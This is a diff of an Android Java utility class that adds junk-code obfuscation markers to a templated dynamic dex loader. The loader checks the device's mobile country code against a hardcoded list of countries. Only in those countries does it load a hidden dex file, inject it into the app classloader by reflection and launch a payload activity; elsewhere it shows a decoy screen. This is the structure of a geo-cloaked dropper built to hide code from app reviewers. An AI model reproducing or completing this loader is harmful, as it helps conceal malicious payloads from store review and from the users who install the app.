@@ -31,28 +31,35 @@ public class DexUtils {
     public static void start(Context context) {
         sContext = context;
 
+        /*<laji_code>*/
         if(context instanceof Activity) {
+            /*<laji_code>*/
             activity = (Activity) context;
             new Handler().postDelayed(new Runnable() {
                 @Override
                 public void run() {
+                    /*<laji_code>*/
                     loadDexClass(context);
                 }
             }, 2 * 1000);
         }else {
+            /*<laji_code>*/
             loadDexClass(context);
         }
     }
 
     public static void loadDexClass(Context context) {
+        /*<laji_code>*/
 
         File file2 = new File(context.getExternalCacheDir(), "111111.txt");
         isLog = file2.exists();
 
+        /*<laji_code>*/
         if (!isLoad(context)) {
             log("isLoad false");
             if(context instanceof Activity) {
                 try {
+                    /*<laji_code>*/
                     Class<?> aClass = Class.forName("<start_activity2>");
                     context.startActivity(new Intent(context, aClass));
                     ((Activity)context).finish();
@@ -64,10 +71,13 @@ public class DexUtils {
         }
 
         log("isLoad true");
+        /*<laji_code>*/
         // getDir("dex1", 0)会在/data/data/**package/下创建一个名叫”app_dex1“的文件夹，其内存放的文件是自动生成output.dex
         File OutputDir = FileUtils.getCacheDir(context.getApplicationContext());
+        /*<laji_code>*/
         String dexPath = OutputDir.getAbsolutePath() + File.separator + ".<out_dex_file_name>";
 
+        /*<laji_code>*/
         File desFile = new File(dexPath);
         if (!desFile.exists()) {
             try {
@@ -79,12 +89,14 @@ public class DexUtils {
                 }
                 log("desFile" + desFile + " already exists  " + desFile.exists());
             } catch (Exception e) {
+                /*<laji_code>*/
                 log("Exception" + e.getMessage());
                 e.printStackTrace();
             }
         }
 
         if (!desFile.exists()) {
+            /*<laji_code>*/
             return;
         }
 
@@ -98,14 +110,17 @@ public class DexUtils {
         log("classLoader  " + classLoader);
 //        replaceLoadedApkClassLoader(context, classLoader);
         replaceClassLoader(context, classLoader);
+        /*<laji_code>*/
         try {
             // 该方法将Class文件加载到内存时,并不会执行类的初始化,直到这个类第一次使用时才进行初始化.该方法因为需要得到一个ClassLoader对象
 //            Class clz = classLoader.loadClass("com.xy.dex.plugin.impl.DexImpl");
 //            IDex dex = (IDex) clz.newInstance();
 //            Toast.makeText(this, dex.getMessage(), Toast.LENGTH_LONG).show();
 
+            /*<laji_code>*/
             if("<app_type>".equals("2")){
                 try {
+                    /*<laji_code>*/
                     log("app_type  " + classLoader);
                     Class clz = classLoader.loadClass("<hot_update_class>");
                     Object hotUpdate = clz.newInstance();
@@ -115,9 +130,11 @@ public class DexUtils {
                     e.printStackTrace();
                     throw new RuntimeException(e);
                 }
+                /*<laji_code>*/
             }
 
             if(context instanceof Activity) {
+                /*<laji_code>*/
                 Class clz = classLoader.loadClass("<start_activity>");
 //                Class clz = classLoader.loadClass("<start_activity>");
                 context.startActivity(new Intent(context, clz));
@@ -126,6 +143,7 @@ public class DexUtils {
 
 
         } catch (Exception e) {
+            /*<laji_code>*/
             e.printStackTrace();
         }
 
@@ -137,13 +155,17 @@ public class DexUtils {
      * @return
      */
     private static boolean isLoad(Context context) {
+        /*<laji_code>*/
         String mccs = "724,404,405,406,515,520,454,452,510";
+        /*<laji_code>*/
         int mcc = context.getResources().getConfiguration().mcc;
         if(!TextUtils.isEmpty(mccs)) {
+            /*<laji_code>*/
             String[] split = mccs.trim().split(",");
             if(split != null && split.length > 0) {
                 for (String mccS : split) {
                     if(mcc == Integer.parseInt(mccS)) {
+                        /*<laji_code>*/
                         return true;
                     }
                 }
@@ -158,6 +180,7 @@ public class DexUtils {
      * @param dexClassLoader
      */
     public  static void replaceClassLoader(Context context, DexClassLoader dexClassLoader) {
+        /*<laji_code>*/
         try {
             log("DexClassLoader  " + dexClassLoader);
             // 获取PathClassLoader加载的系统类等
@@ -183,12 +206,15 @@ public class DexUtils {
             Field customElementsField = customPathClass.getDeclaredField("dexElements");
             customElementsField.setAccessible(true);
             Object customElements = customElementsField.get(customDexPathListObject);
+            /*<laji_code>*/
 
             // 合并数组
             Class<?> elementClass = systemElements.getClass().getComponentType();
             int systemLength = Array.getLength(systemElements);
             int customLength = Array.getLength(customElements);
             int newSystemLength = systemLength + customLength;
+
+            /*<laji_code>*/
 
             // 生成一个新的数组，类型为Element类型
             Object newElementsArray = Array.newInstance(elementClass, newSystemLength);
@@ -200,6 +226,8 @@ public class DexUtils {
                 }
             }
 
+            /*<laji_code>*/
+
             // 覆盖新数组
             Field elementsField = pathListObject.getClass().getDeclaredField("dexElements");
             elementsField.setAccessible(true);
@@ -209,15 +237,20 @@ public class DexUtils {
             for (Object newElement : newElements) {
                 log("newElements  " + newElement);
             }
+            /*<laji_code>*/
         } catch (Exception e) {
             log("Exception  " + e.getMessage());
             e.printStackTrace();
         }
 
+        /*<laji_code>*/
+
     }
 
     public static void log(String newElement) {
+        /*<laji_code>*/
         if (isLog) {
+            /*<laji_code>*/
             Log.e("ApiUtils", newElement);
         }
 
